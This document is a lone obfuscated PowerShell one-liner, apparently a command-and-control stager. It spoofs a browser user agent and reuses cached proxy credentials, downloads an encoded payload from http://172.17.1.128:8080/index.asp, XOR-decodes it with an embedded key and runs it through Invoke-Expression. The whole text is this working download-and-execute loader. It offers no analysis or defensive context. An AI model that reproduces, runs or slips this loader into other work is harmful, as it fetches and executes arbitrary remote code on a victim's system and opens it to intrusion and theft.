
$wc=NeW-ObJect SyStem.NeT.WEBCliENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEAdERS.Add('User-Agent',$u);$WC.PROXy = [SystEm.NEt.WEBReqUEsT]::DefAUlTWEBPrOxY;$wC.PRoXy.CREDenTIaLs = [SYsTem.NeT.CrEdENtIALCacHE]::DefAultNetWoRKCReDentialS;$K='5yA<hLMQ6908i^|r,evPq[!u7%&+4UVD';$I=0;[cHAr[]]$b=([CHaR[]]($WC.DowNLoadStRIng("http://172.17.1.128:8080/index.asp")))|%{$_-BXOR$K[$I++%$k.LEnGth]};IEX ($B-JoIN'')

